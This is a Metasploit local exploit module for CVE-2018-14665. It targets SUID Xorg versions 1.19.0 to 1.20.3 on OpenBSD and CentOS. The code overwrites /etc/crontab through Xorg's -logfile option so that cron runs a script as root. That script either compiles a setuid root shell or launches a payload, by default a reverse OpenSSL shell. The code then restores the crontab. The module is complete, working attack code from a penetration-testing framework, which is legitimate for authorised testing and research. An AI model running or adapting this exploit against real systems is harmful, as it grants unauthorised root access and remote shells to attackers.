##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xorg X11 Server SUID privilege escalation',
      'Description'    => %q{
        This module attempts to gain root privileges with SUID Xorg X11 server
        versions prior to 1.20.3.

        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg versions 1.19.0 < 1.20.3.  This allows unprivileged users
        that start the server the ability to elevate privileges and run
        arbitrary code under root privileges.

        This module writes a cron job using the Xorg -logfile option. On write
        crontab.old will be created so it must be removed after exploit.  Cron
        will then run a small script to launch a payload. It has been tested with
        OpenBSD 6.3,6.4 and CentOS 7.  Xorg must have SUID permissions. Success
        on CentOS depends on the session having console for starting Xorg
        along with selinux settings, may work but is currently not supported.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Narendra Shinde', # Discovery and exploit
          'Raptor - 0xdea',  # Modified exploit for cron
          'Aaron Ringo'      # Metasploit module
        ],
      'DisclosureDate' => 'Oct 25 2018',
      'References'     =>
        [
           [ 'CVE', '2018-14665' ],
           [ 'BID', '105741' ],
           [ 'URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html' ],
           [ 'URL', 'https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm' ]
        ],
      'Platform'       =>  %w(unix openbsd),
      'Arch'           =>    ARCH_CMD,
      'SessionTypes'   =>    'shell',
      'Targets'        =>
        [
           ['OpenBSD', {
            'Platform' => 'unix',
            'Arch' => [ ARCH_CMD ] } ]
        ],
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'cmd/unix/reverse_openssl'
        },

      'DefaultTarget'  => 0))
    register_options(
      [
        OptString.new('PAYLOAD_LOC', [ true, 'SUID binary to create', '/usr/local/bin/shell' ]),
        OptBool.new('BUILTIN', [ true, 'Privesc in current session', true ])
      ])
     register_advanced_options(
      [
         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
         OptString.new('Xdisplay', [ true, 'Display exploit will attempt to use', ':1' ])
      ]
    )
  end


  def check
    #suid program check
    xorg_path = cmd_exec("which Xorg")
    unless xorg_path.include?("Xorg")
      vprint_good "Xorg path was: #{xorg_path}"
      return CheckCode::Safe
    end
    vprint_good "Xorg path found at #{xorg_path}"
    unless setuid? xorg_path
      vprint_error "Xorg binary #{xorg_path} is not SUID"
      return CheckCode::Safe
    end
    vprint_good "Xorg binary #{xorg_path} is SUID"

    #version check
    x_version = cmd_exec("Xorg -version")
    v = Gem::Version.new(x_version.scan(/\d.\d+.\d/).first)
    unless v.between?(Gem::Version.new('1.19.0'), Gem::Version.new('1.20.3'))
      fail_with Failure::NotVulnerable, "Xorg version #{v} not supported"
    end
    vprint_good "Xorg version #{v} is vulnerable"

    #process check
    proc_list = []
    proc_list = cmd_exec("ps ax")
    if proc_list.include?('X')
      vprint_warning('Xorg in process list. Can you stop it?')
      return CheckCode::Safe
    else
      vprint_good('Xorg does not appear running')
      return CheckCode::Detected
    end
  end


  def exploit
    check_status = check
    unless check_status == CheckCode::Detected
       fail_with Failure::NotVulnerable, 'Target not vulnerable'
    end
    if is_root?
      fail_with Failure::BadConfig, 'This session already has root privileges'
    end

    xdisplay = datastore['Xdisplay']
    builtin_only = datastore['BUILTIN']
    payload_path = datastore['PAYLOAD_LOC']
    pscript = "#{datastore['WritableDir']}/.session-#{rand_text_alphanumeric 5..10}"
    payload_c = "#{pscript}.c"

    #Making file crontab will run
    cron_script = ''
    if builtin_only == false
      print_status 'Uploading your payload'
      cron_script << payload.encoded.gsub('"', '\"').gsub('$', '\$')
      write_file(pscript,cron_script)
      vprint_status cron_script
    else
      print_good 'Attempting privesc within current session'
      cron_script << "cp /bin/sh #{payload_path}\n"
      cron_script << "gcc #{payload_c} -o #{payload_path}\n"
      cron_script << "chmod 4777 #{payload_path}\n"
      suid_c = 'main(){setuid(0);setgid(0);system("/bin/sh");}'
      write_file(pscript,cron_script)
      vprint_status cron_script
      write_file(payload_c,suid_c)
      vprint_status suid_c
      register_file_for_cleanup payload_c
      register_file_for_cleanup payload_path
    end
    register_file_for_cleanup pscript
    chmod pscript

    # Exploit steps on crontab so backing it up
    cmd_exec "cat /etc/crontab > #{pscript}.b"

    # Actual exploit with cron overwrite
    print_status 'Trying /etc/crontab overwrite'
    cmd_exec "cd /etc ; Xorg -fp '* * * * * root #{pscript}' -logfile crontab #{xdisplay} & >/dev/null"
    Rex.sleep 5
    cmd_exec "pkill Xorg"
    Rex.sleep 5
    cron_check = cmd_exec "grep -F #{pscript} /etc/crontab"
    unless cron_check.include? pscript
      fail_with Failure::NotVulnerable, '/etc/crontab not modified'
    end
    print_good '/etc/crontab overwrite successful'

    12.times do
      print_status 'Waiting on cron to run'
      Rex.sleep 10
      break if exists? payload_path
      break unless exists? pscript      # will be cleaned up on successful exploit
    end

    #Time to become root and clean up a little
    if builtin_only == true
      print_good 'Payload written..executing'
      cmd_exec payload_path
      if is_root?
        print_good 'Your session now has root privileges'
        print_good 'Cleaning up and restoring crontab entries'
        cmd_exec "cat #{pscript}.b > /etc/crontab"
        rm_f "/etc/crontab.old"
      end
    else
      Rex.sleep 2
      #<on_next_session for this?
      print_status "This scripts' session does not have root"
      print_warning 'You have some clean-up to do in new session'
      print_warning "cat #{pscript}.b > /etc/crontab ; rm -f #{pscript}.*"
      print_warning 'rm -f /etc/crontab.old'
    end
  end
end
